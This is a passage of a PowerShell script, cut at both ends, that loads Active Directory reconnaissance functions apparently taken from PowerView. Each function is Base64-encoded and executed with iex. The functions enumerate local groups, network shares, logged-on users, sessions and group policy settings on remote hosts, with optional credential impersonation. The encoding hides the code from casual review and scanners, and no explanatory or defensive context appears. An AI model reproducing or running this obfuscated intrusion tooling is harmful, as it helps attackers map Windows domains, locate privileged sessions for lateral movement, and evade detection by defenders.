zWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkQ29udmVydEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb252ZXJ0QXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udmVydEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICAgICAgJENvbnZlcnRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgIH0KICAgICAgICBpZiAoJFBvbGljeSAtZXEgJ0FsbCcpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJyonCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBvbGljeSAtZXEgJ0RvbWFpbicpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3szMUIyRjM0MC0wMTZELTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCgkUG9saWN5IC1lcSAnRG9tYWluQ29udHJvbGxlcicpIC1vciAoJFBvbGljeSAtZXEgJ0RDJykpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3s2QUMxNzg2Qy0wMTZGLTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFBvbGljeQogICAgICAgIH0KICAgICAgICAkR1BPUmVzdWx0cyA9IEdldC1Eb21haW5HUE8gQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgRm9yRWFjaCAoJEdQTyBpbiAkR1BPUmVzdWx0cykgewogICAgICAgICAgICAkR3B0VG1wbFBhdGggPSAkR1BPLmdwY2ZpbGVzeXNwYXRoICsgIlxNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYiCiAgICAgICAgICAgICRQYXJzZUFyZ3MgPSAgQHsKICAgICAgICAgICAgICAgICdHcHRUbXBsUGF0aCcgPSAkR3B0VG1wbFBhdGgKICAgICAgICAgICAgICAgICdPdXRwdXRPYmplY3QnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFBhcnNlQXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICBHZXQtR3B0VG1wbCBAUGFyc2VBcmdzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPTmFtZScgJEdQTy5uYW1lCiAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQTy5kaXNwbGF5bmFtZQogICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvY2FsR3JvdXAgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cC5BUEknKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNPTVBVVEVSTkFNRSwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FQSScsICdXaW5OVCcpXQogICAgICAgIFtBbGlhcygnQ29sbGVjdGlvbk1ldGhvZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1ldGhvZCA9ICdBUEknLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIGlmICgkTWV0aG9kIC1lcSAnQVBJJykgewogICAgICAgICAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAkRW50cmllc1JlYWQgPSAwCiAgICAgICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldExvY2FsR3JvdXBFbnVtKCRDb21wdXRlciwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRMT0NBTEdST1VQX0lORk9fMTo6R2V0U2l6ZSgpCiAgICAgICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRMT0NBTEdST1VQX0lORk9fMQogICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRJbmZvLmxncnBpMV9uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbW1lbnQnICRJbmZvLmxncnBpMV9jb21tZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwLkFQSScpCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRMb2NhbEdyb3VwXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRDb21wdXRlclByb3ZpZGVyID0gW0FEU0ldIldpbk5UOi8vJENvbXB1dGVyLGNvbXB1dGVyIgogICAgICAgICAgICAgICAgJENvbXB1dGVyUHJvdmlkZXIucHNiYXNlLmNoaWxkcmVuIHwgV2hlcmUtT2JqZWN0IHsgJF8ucHNiYXNlLnNjaGVtYUNsYXNzTmFtZSAtZXEgJ2dyb3VwJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwID0gKFtBRFNJXSRfKQogICAgICAgICAgICAgICAgICAgICRHcm91cCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAoJExvY2FsR3JvdXAuSW52b2tlR2V0KCdOYW1lJykpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRMb2NhbEdyb3VwLkludm9rZUdldCgnb2JqZWN0c2lkJyksMCkpLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21tZW50JyAoJExvY2FsR3JvdXAuSW52b2tlR2V0KCdEZXNjcmlwdGlvbicpKQogICAgICAgICAgICAgICAgICAgICRHcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVCcpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNoYXJlIHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2hhcmVJbmZvJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRRdWVyeUxldmVsID0gMQogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0U2hhcmVFbnVtKCRDb21wdXRlciwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCiAgICAgICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewogICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRTSEFSRV9JTkZPXzE6OkdldFNpemUoKQogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkU0hBUkVfSU5GT18xCiAgICAgICAgICAgICAgICAgICAgJFNoYXJlID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkU2hhcmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkU2hhcmUuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlNoYXJlSW5mbycpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgJFNoYXJlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0U2hhcmVdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvZ2dlZG9uIHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9nZ2VkT25Vc2VySW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkUXVlcnlMZXZlbCA9IDEKICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkRW50cmllc1JlYWQgPSAwCiAgICAgICAgICAgICRUb3RhbFJlYWQgPSAwCiAgICAgICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCiAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldFdrc3RhVXNlckVudW0oJENvbXB1dGVyLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFdLU1RBX1VTRVJfSU5GT18xOjpHZXRTaXplKCkKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFdLU1RBX1VTRVJfSU5GT18xCiAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8nKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgICAgICRMb2dnZWRPbgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldExvZ2dlZG9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNlc3Npb24gewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TZXNzaW9uSW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkUXVlcnlMZXZlbCA9IDEwCiAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAkUmVzdW1lSGFuZGxlID0gMAogICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRTZXNzaW9uRW51bSgkQ29tcHV0ZXIsICcnLCAkVXNlck5hbWUsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQogICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCiAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkU0VTU0lPTl9JTkZPXzEwOjpHZXRTaXplKCkKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFNFU1NJT05fSU5GT18xMAogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TZXNzaW9uSW5mbycpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgJFNlc3Npb24KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVJlZ0xvZ2dlZE9uIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlJlZ0xvZ2dlZE9uVXNlcicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JwogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkUmVnID0gW01pY3J